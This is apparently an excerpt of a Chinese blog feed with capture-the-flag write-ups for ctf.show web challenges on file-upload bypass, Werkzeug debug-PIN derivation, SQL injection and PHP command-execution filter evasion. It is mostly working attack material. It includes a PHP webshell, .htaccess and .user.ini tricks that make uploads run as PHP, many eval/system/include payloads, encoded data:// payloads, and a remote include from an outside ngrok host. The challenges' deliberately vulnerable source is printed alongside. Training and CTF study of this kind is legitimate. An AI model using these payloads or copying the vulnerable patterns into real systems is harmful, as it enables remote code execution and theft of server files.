$arr[&#39;extension&#39;];            if(in_array($ext_suffix, array(&quot;jpg&quot;)))&#123;                $jpg = imagecreatefromjpeg($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);                if($jpg==FALSE)&#123;                    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);                &#125;else&#123;                    $dst = &#39;upload/&#39;.md5($_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.jpg&quot;;                    imagejpeg($jpg,$dst);                    $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;md5($_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.jpg&quot;);                &#125;            &#125;else&#123;                $ret = array(&quot;code&quot;=&gt;3,&quot;msg&quot;=&gt;&quot;只允许上传jpg格式图片&quot;);            &#125;                                &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><h2 id="上传zip文件"><a href="#上传zip文件" class="headerlink" title="上传zip文件"></a>上传zip文件</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190013197.png" alt="image-20220409190013197"></p><p>新建一个zip文件写入一句话</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190250489.png" alt="image-20220409190250489"></p><p>直接上传</p><p>下载的时候抓包</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190330204.png" alt="image-20220409190330204"></p><p>访问</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190348075.png" alt="image-20220409190348075"></p><p>upload.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-28 22:14:40 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;application/x-zip-compressed&#39;)&#123;            $arr = pathinfo($filename);            $ext_suffix = $arr[&#39;extension&#39;];            if(in_array($ext_suffix, array(&quot;zip&quot;)))&#123;                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &#39;./upload/&#39;.md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]).&#39;.zip&#39;);                $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]).&#39;.zip&#39;);            &#125;else&#123;                $ret = array(&quot;code&quot;=&gt;3,&quot;msg&quot;=&gt;&quot;只允许上传zip格式文件&quot;);            &#125;                                &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h1><h2 id="haccess绕过"><a href="#haccess绕过" class="headerlink" title=".haccess绕过"></a>.haccess绕过</h2><p><a href="https://www.cnblogs.com/milantgh/p/5116955.html">apache解析漏洞</a></p><p>先上传.htaccess文件</p><pre><code>AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</code></pre><p>或者</p><pre><code>&lt;FilesMatch &quot;png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>先改名为.jpg哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409191234392.png" alt="image-20220409191234392"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409191314806.png" alt="image-20220409191314806"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409191342770.png" alt="image-20220409191342770"></p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-28 22:14:40 email: h1xa@ctfer.com link: https://ctfer.com*/#error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;)&#123;            $arr = pathinfo($filename);            $ext_suffix = $arr[&#39;extension&#39;];            if(!in_array($ext_suffix, array(&quot;php&quot;)))&#123;                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &#39;./upload/&#39;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;name&quot;]);            &#125;else&#123;                $ret = array(&quot;code&quot;=&gt;3,&quot;msg&quot;=&gt;&quot;只允许上传jpg格式文件&quot;);            &#125;                                &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;echo json_encode($ret);</code></pre><h1 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h1><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><pre><code class="php">&lt;?php$a=$_REQUEST[&#39;a&#39;];$b=$_REQUEST[&#39;b&#39;];$a($b);?&gt;</code></pre><p>这个还行</p><p>直接传php哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409203031866.png" alt="image-20220409203031866"></p><p>访问</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409204412138.png" alt="image-20220409204412138"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409204452770.png" alt="image-20220409204452770"></p><h1 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h1><h2 id="user-ini日志包含"><a href="#user-ini日志包含" class="headerlink" title=".user.ini日志包含"></a>.user.ini日志包含</h2><p>上传zip哦,在该content</p><pre><code>auto_append_file=&quot;/var/log/nginx/access.log&quot;</code></pre><p>上传一个user.ini ua加一句话</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409210821709.png" alt="image-20220409210821709"></p><p>接着上传一个1.php文件,内容随便</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409210852788.png" alt="image-20220409210852788"></p><p>连接1.php文件</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-30 00:11:17 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;            $str = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);            if(check($str)===0)&#123;                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &#39;./upload/&#39;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;name&quot;]);            &#125;                    &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;function check($str)&#123;    return preg_match(&#39;/eval|include|require|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|php|\\$|\?|\&lt;|\&gt;/i&#39;, $str);&#125;echo json_encode($ret);</code></pre><h1 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409211240811.png" alt="image-20220409211240811"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409211338918.png" alt="image-20220409211338918"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409211444701.png" alt="image-20220409211444701"></p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-10-24 19:34:52 Last Modified by:   h1xa Last Modified time: 2020-10-30 00:11:17 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;    $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);&#125;else&#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024);    if($filesize&gt;1024)&#123;        $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;);    &#125;else&#123;        if($_FILES[&#39;file&#39;][&#39;type&#39;] == &#39;image/png&#39;)&#123;            $str = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);            if(check($str)===0)&#123;                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &#39;./upload/&#39;.$_FILES[&quot;file&quot;][&quot;name&quot;]);                $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;name&quot;]);            &#125;                    &#125;else&#123;            $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;);        &#125;            &#125;&#125;function check($str)&#123;    return preg_match(&#39;/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|php|\\$|\?|\&lt;|\&gt;|\(|\)|\&#123;|\[|\&#125;|\]|\,|\%|\`|\~|\+/i&#39;, $str);&#125;echo json_encode($ret);</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用姿势</title>
      <link href="/ctfshow/ctf.show/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
      <url>/ctfshow/ctf.show/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414193004005.png" alt="image-20220414193004005"></p><p>可以读文件,查看本地进程</p><pre><code class="php">/proc/self/cmdline</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414193116871.png" alt="image-20220414193116871"></p><p>可见是个py程序</p><p>python后台地址&#x2F;app&#x2F;app.py</p><pre><code class="php">/etc/passwd</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144504561.png" alt="image-20220417144504561"></p><pre><code class="php">/usr/local/lib/python3.8/site-packages/flask/app.py</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144543865.png" alt="image-20220417144543865"></p><pre><code class="php">/sys/class/net/eth0/address</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144605982.png" alt="image-20220417144605982"></p><pre><code class="php">/proc/sys/kernel/random/boot_id</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144634650.png" alt="image-20220417144634650"></p><pre><code class="php">/proc/self/cgroup</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144708334.png" alt="image-20220417144708334"></p><pre><code class="php">import hashlibimport getpassfrom flask import Flaskfrom itertools import chainimport sysimport uuidimport typing as tusername=&#39;root&#39; #/etc/passwdapp = Flask(__name__)modname= getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)mod=sys.modules.get(modname)mod = getattr(mod, &quot;__file__&quot;, None)probably_public_bits = [    username, #用户名    modname,  #一般固定为flask.app    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask    &#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39;,   #主程序（app.py）运行的绝对路径]print(probably_public_bits)mac =&#39;02:42:ac:0c:e4:fe&#39;.replace(&#39;:&#39;,&#39;&#39;)#/sys/class/net/eth0/addressmac=str(int(mac,base=16))private_bits = [   mac,#mac地址十进制 &quot;653dc458-4634-42b1-9a7a-b22a082e1fcecb3154994b94a4a667e472248cb1a254df7e0b46987a3056cca25a996dde7c97&quot; #/proc/sys/kernel/random/boot_id /proc/self/cgroup     ]print(private_bits)h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;# If we need to generate a pin we salt it a bit more so that we don&#39;t# end up with the same value and generate out 9 digitsh.update(b&quot;pinsalt&quot;)num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]# Format the pincode in groups of digits for easier remembering if# we don&#39;t have a result yet.rv=Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = &quot;-&quot;.join(                num[x : x + group_size].rjust(group_size, &quot;0&quot;)                for x in range(0, len(num), group_size)            )            break    else:        rv = numprint(rv)</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大赛原型</title>
      <link href="/ctfshow/ctf.show/%E5%A4%A7%E8%B5%9B%E5%8E%9F%E5%9E%8B/"/>
      <url>/ctfshow/ctf.show/%E5%A4%A7%E8%B5%9B%E5%8E%9F%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="web680"><a href="#web680" class="headerlink" title="web680"></a>web680</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415184940885.png" alt="image-20220415184940885"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415200517421.png" alt="image-20220415200517421"></p><p>看看还剩啥</p><pre><code class="php">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstoped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,fopen,file_get_contents,fread,file,readfile,opendir,readdir,closedir,rewinddir</code></pre><pre><code class="php">code=print_r(scandir(&#39;./&#39;));</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415200647646.png" alt="image-20220415200647646"></p><pre><code class="配合P">code=highlight_file(&quot;secret_you_never_know&quot;);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415200719749.png" alt="image-20220415200719749"></p><pre><code class="php">code=var_dump(scandir(&quot;.&quot;));</code></pre><pre><code class="php">code=$a=new DirectoryIterator(&#39;glob:///var/www/html/*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre><h2 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCE总结</a></h2><h1 id="web681"><a href="#web681" class="headerlink" title="web681"></a>web681</h1><p>不能扫目录,我们看看字典里有没有,就直接访问了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415203154362.png" alt="image-20220415203154362"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415203139503.png" alt="image-20220415203139503"></p><p>check.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-09-24 14:58:16 Last Modified by:   h1xa Last Modified time: 2021-09-24 16:04:49 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);include &quot;common.php&quot;;session_start();if (isset($_POST[&quot;name&quot;]))&#123;  $name = str_replace(&quot;&#39;&quot;, &quot;&quot;, trim(waf($_POST[&quot;name&quot;])));  if (strlen($name) &gt; 11)&#123;    echo(&quot;&lt;script&gt;alert(&#39;name too long&#39;)&lt;/script&gt;&quot;);  &#125;else&#123;    $sql = &quot;select count(*) from ctfshow_users where username = &#39;$name&#39; or nickname = &#39;$name&#39;&quot;;    echo $sql;    $db = new db();    $result = $db-&gt;select_one_array($sql);    if ($result[0])&#123;      $_SESSION[&#39;hat&#39;] = &#39;black&#39;;      echo &#39;good job&#39;;    &#125;else&#123;    $_SESSION[&#39;hat&#39;] = &#39;green&#39;;    &#125;    header(&quot;Location: index.php&quot;);  &#125;&#125;</code></pre><pre><code class="php">select count(*) from ctfshow_users where username = &#39;or/**/(1)#\&#39; or nickname = &#39;or/**/(1)#\&#39;</code></pre><p>我们添加了\就会把’进行转义</p><pre><code class="php">or/**/(1)#\&#39; or nickname = </code></pre><p>查询语句就会变成</p><pre><code class="php">select count(*) from ctfshow_users where username = &#39;xxx&#39;or/**/(1)#\&#39;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220416180738970.png" alt="image-20220416180738970"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262021706.png" alt="image-20220326202110674"></p><p>源码开局</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029492.png" alt="image-20220326202926453"></p><p><strong>拼接</strong></p><pre><code>c=system(&#39;a=g;cat$IFS$1fla$a.php&#39;);c=system(&#39;1;a=f;d=ag;c=l;cat$IFS$a$c$d.php&#39;);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262029538.png" alt="image-20220326202939503"></p><p>或者</p><pre><code>?c=system(&quot;nl fla?????&quot;);?c=system(&quot;nl fla*&quot;);?c=echo `nl fl&#39;&#39;ag.php`;或者c=echo `nl fl“”ag.php`;?c=echo `nl fl\ag.php`;//转义字符绕过?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php?c=eval($_GET[zf]);&amp;zf=system(&#39;nl flag.php&#39;);?c=system(&#39;a=g;cat$IFS$1fla$a.php&#39;);?c=system(&#39;1;a=f;d=ag;c=l;cat$IFS$a$c$d.php&#39;);?cecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh?c=system(&#39;cat$IFS$9`ls`&#39;);</code></pre><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 00:42:26  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>这里发现多过滤了一个system函数,PHP中执行方法的函数有很多,比如passsthru exec shell_exec </p><p><strong>法一</strong></p><p>使用exec执行函数,虽然exec对执行结果不输出,但是可把执行的结果写入1.txt中,之后在查看1.txt文件</p><pre><code>复制?c=exec(&#39;cp fla* 1.txt&#39;);拼接?c=exec(&#39;cat  &gt; 2.txt&#39;);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292239718.png" alt="image-20220329223900674"></p><p>方法二</p><p>用passthru函数执行命令,与exec的区别是 passthru直接将结果输出,不返回结果,不用使用echo查看结果</p><pre><code>?c=passthru(&#39;cat `ls`&#39;);</code></pre><p>方法三</p><p>在php中echo 命令;也是可以执行并输出的,</p><pre><code>?c=echo `ls`;echo `cat fla*`;</code></pre><h2 id="执行命令函数"><a href="#执行命令函数" class="headerlink" title="执行命令函数"></a>执行命令函数</h2><pre><code>system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec()`` 反引号 同shell_exec() </code></pre><p>payload</p><pre><code>?c=echo exec(&#39;nl fla?????&#39;);?c=echo `nl fla&#39;&#39;g.p&#39;&#39;hp`;?c=echo `nl fla?????`;还有上一道题的很多payload都可以使用</code></pre><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 00:49:10  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>cat被过滤 空格也被过滤</p><h2 id="linux查看文件"><a href="#linux查看文件" class="headerlink" title="linux查看文件"></a>linux查看文件</h2><pre><code>more:    一页一页的显示内容less:    与more类似head:    查看头几行tac:    从最后一行开始显示cat:    的反向显示tail:    查看尾几行nl:        显示的时候顺便输出行号od:        以二进制方法读取内容vi:        一种编辑器vim:    一种编辑器sort:    可以查看uinq:    可以查看 file -f:报错出具体内容grepgrep:    在当前目录中,找出后缀有file字样的文件中包含test字符串的文件,并打印出该字符串的行.grep test *file strings</code></pre><p>payload</p><pre><code>?c=eval($_GET[zf]);&amp;zf=system(&#39;ls&#39;);?c=eval($_POST[zf]);    POST:zf=system(&#39;ls&#39;);?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));?c=show_source(next(array_reverse(scandir(pos(localeconv())))));?c=echo(`nl%09fl[abc]*`);?c=&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;nl%09fl[a]*&quot;);等价于system()?c=echo`strings    f*`;?c=echo`strings\$IFS\$9f*`; 必须加转义字符</code></pre><h2 id="php原生方法查看文件"><a href="#php原生方法查看文件" class="headerlink" title="php原生方法查看文件"></a>php原生方法查看文件</h2><pre><code>print_r(scandir(dirname(__FILE__)));查看当前目录下文件print_r(next(array_reverse(scandir(dirname(__FILE__)))));c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></pre><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 00:56:31  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>include可以不用括号,分号可以用?&gt;代替</p><h2 id="过滤括号include"><a href="#过滤括号include" class="headerlink" title="过滤括号include"></a>过滤括号include</h2><p>payload</p><pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行,这里的远程文件是txt的,如果是php就会执行远程服务器上的命令</code></pre><h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 02:22:27  email: h1xa@ctfer.com  link: https://ctfer.com*///error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</code></pre><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 04:21:29  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</code></pre><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 04:21:23  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</code></pre><h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 04:21:16  email: 